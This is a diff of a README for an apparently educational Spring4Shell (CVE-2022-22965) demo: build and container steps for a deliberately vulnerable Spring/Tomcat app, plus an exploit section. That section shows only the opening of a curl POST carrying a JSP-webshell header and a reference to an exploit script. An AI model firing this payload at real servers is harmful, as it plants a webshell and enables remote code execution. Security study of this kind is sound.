@@ -1,39 +1,46 @@
-Spring4Shell (CVE-2022-22965) Demo
-Demonstrates the vulnerability in Spring Framework data binding that allows RCE via Tomcat's AccessLogValve.
-Requirements
-JDK 11+
-Maven
-Docker or Podman
+# Spring4Shell (CVE-2022-22965) Demo App and an exploit
+Demonstrates the CVE-2022-22965 vulnerability in Spring Framework data binding that allows RCE via Tomcat's AccessLogValve.
 
+## Requirements:
+- JDK 11+ (JDK 9 min. vulnerable version)
+- Maven
+- Docker or Podman
+- Python >=3.12
 
-Working with this app:
+## The demo app
 
-demo app is in the test-app directory
+```
 cd test-app 
 mvn clean compile
 
-run the app locally - not vulnerable
+run the app locally  // not vulnerable
 mvn spring-boot:run 
+```
 
-http://localhost:8080/greeting
+Access the web app via: http://localhost:8080/greeting
 
-
-build the actuall war
+Build the `war` for vulnerable deployment
+```
 mvn clean package -DskipTests
 
-(podman machine init
- podman machine start)
+// for macos + podman users
+podman machine init
+podman machine start
+
 podman build -t test-app .
 podman run -d --name test-app -p 8080:8080 test-app
+```
 
-curl http://localhost:8080/spring4shell-demo/greeting
+Access the containerized  (vulnerable) app via http://localhost:8080/spring4shell-demo/greeting
 
-Troubleshooting
+### Troubleshooting the demo app
+```
 podman logs test-app
 jar tf target/spring4shell-demo.war | head -20
+```
 
+## Exploit
 
-Exploit
 bash
 curl -X POST \
   -H "pre:<%" \
@@ -102,3 +109,13 @@ python exploit.py
 
 references:
 https://tomcat.apache.org/tomcat-9.0-doc/config/valve.html#Access_Log_Valve/Attributes
+
+https://www.geeksforgeeks.org/python/how-to-create-requirements-txt-file-in-python/
+https://www.geeksforgeeks.org/installation-guide/how-to-install-virtual-environment-in-python-on-macos/
+
+
+source exploit/bin/activate
+
+
+failed 
+no basic error handling
